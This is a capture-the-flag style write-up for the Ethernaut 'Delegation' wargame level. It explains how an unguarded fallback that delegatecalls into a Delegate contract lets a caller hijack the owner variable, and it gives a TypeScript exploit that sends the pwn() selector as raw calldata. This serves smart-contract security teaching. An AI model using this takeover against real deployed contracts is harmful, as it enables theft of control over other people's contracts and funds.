# Solution for Ethernaut Level 06: Delegation

## Goal

The goal is to claim ownership of the `Delegation` contract.

## Vulnerability Analysis

The vulnerability lies in the `fallback()` function of the `Delegation` contract, which uses `delegatecall`.

```solidity
contract Delegation {
    address public owner;
    Delegate delegate;

    // ... constructor ...

    fallback() external {
        (bool result, ) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}

contract Delegate {
    address public owner;

    // ... constructor ...

    function pwn() public {
        owner = msg.sender;
    }
}
```

The `delegatecall` opcode is a powerful feature that executes code from another contract (the `Delegate` contract) within the context of the calling contract (`Delegation`). This means that storage, balance, and the identity of the caller (`msg.sender`) are all preserved from the `Delegation` contract's perspective.

When the `fallback()` function in `Delegation` is triggered, it forwards the call via `delegatecall` to the `Delegate` contract. The `Delegate` contract has a public `pwn()` function which sets its `owner` state variable to `msg.sender`. Because this code is executed in the `Delegation` contract's context, it is `Delegation`'s `owner` variable that gets modified, not `Delegate`'s.

Therefore, by forcing the `Delegation` contract to `delegatecall` the `pwn()` function, an attacker can change its ownership.

## The Exploit

The `exploit.ts` script crafts a raw transaction to call the `pwn()` function on the `Delegation` contract. This triggers the vulnerable `fallback` function and the subsequent `delegatecall`, leading to ownership transfer.

### Step 1: Calculate the Function Selector for `pwn()`

To invoke the `pwn()` function through the `fallback`, we need its unique 4-byte function selector. The script calculates this by taking the first 4 bytes of the Keccak-256 hash of the function's signature, "pwn()".

```typescript
solidityPackedKeccak256(["string"], ["pwn()"]).slice(0, 10)
```
This calculation results in the function selector `0xdd365b8b`.

### Step 2: Send the Transaction to Trigger the Fallback

The script sends a transaction directly to the `Delegation` contract address. The `data` field of this transaction is populated with the function selector for `pwn()`.

```typescript
console.log("Call pwn function");
await (
  await player.sendTransaction({
    to: delegationAddress,
    data: solidityPackedKeccak256(["string"], ["pwn()"]).slice(0, 10),
  })
).wait();
console.log("New owner:", await delegation.owner());
```

Because the `Delegation` contract does not have a function matching the `0xdd365b8b` signature, its `fallback()` function is executed. This, in turn, runs the `pwn()` function's logic via `delegatecall`. As a result, the `owner` variable in the `Delegation` contract's storage is updated to the `player`'s address, successfully completing the level.